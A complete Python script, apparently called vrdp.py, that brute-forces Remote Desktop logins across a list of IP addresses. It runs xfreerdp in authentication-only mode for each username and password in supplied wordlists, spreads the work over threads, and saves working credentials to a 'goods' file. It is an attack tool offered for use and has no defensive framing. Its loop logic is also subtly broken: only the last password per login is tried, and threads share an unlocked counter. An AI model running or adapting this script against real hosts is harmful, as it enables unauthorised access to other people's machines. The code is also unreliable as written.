import os
import sys
import subprocess
import shlex
import re
from threading import Thread

#Selects
try:
	lista = sys.argv[1]
	login = sys.argv[2]
	password = sys.argv[3]
	threadis = int(sys.argv[4])
	goods = sys.argv[5]
except:
	print('Set Lists!!')
	print('> vrdp.py (ips) (logins) (passwords) (threads) (goods)')
	sys.exit()

#Ips
lista = open(lista, 'r')
lista = lista.readlines()

#Logins
login = open(login, 'r')
login = login.readlines()

#Passwords
password = open(password, 'r')
password = password.readlines()

testados = 0
#Def Conexoes
def testar(hostname, username, password, Bloco):
    global testados
    global goods
    testados = (testados+1)

    rdp_cmd = ("xfreerdp /v:{0} /port:3389 /u:{1} /p:{2} /ncs /sec:nla /cert-ignore +auth-only".format(hostname, username, password))
    proc = subprocess.Popen(shlex.split(rdp_cmd), shell=False, stderr=subprocess.PIPE,)
    msgtest = str(proc.communicate())

    if re.search("Authentication only, exit status 0", msgtest):
        live = ('#RDP {0}:3389 - Login:{1} Pass:{2} - Tested: {3} - Block: {4}'.format(hostname, username, password, testados, Bloco))
        print("\033[92m{0}\033[0m".format(live))
        arquivo = open(goods, 'a')
        arquivo.write("{0}\n".format(live))
        arquivo.close()
        proc.terminate()
    elif re.search("exit status 1", msgtest):
        print('\033[31m#Error {0}:3389 - Login:{1} Pass:{2} - Tested: {3} - Block: {4}\033[0m'.format(hostname, username, password, testados, Bloco))
        proc.terminate()
    else:
        print('\033[31m#InternalError {0}:3389 - Login:{1} Pass:{2} - Tested: {3} - Block: {4}\033[0m'.format(hostname, username, password, testados, Bloco))
        proc.terminate()

tconter = -1
#Test Rdp
def check():
    global tconter
    try:
        for ip in lista:
            tconter = tconter+1
            ip = lista[tconter]
            ip = ip.strip()
            Bloco = tconter
            for logi in login:
                logi = logi.strip()
                for passw in password:
                    passw = passw.strip()
                try:
                        testar(ip, logi, passw, Bloco)
                except:
                        print('#Error {0}:22 - Login:{1} Pass:{2}'.format(ip, logi, passw))
    except:
        print('List Tested!')
        sys.exit()
#Threading
for x in range(threadis):
    try:
        t = Thread(target=check)
        t.start()
    except:
        print('ERROR THREAD')
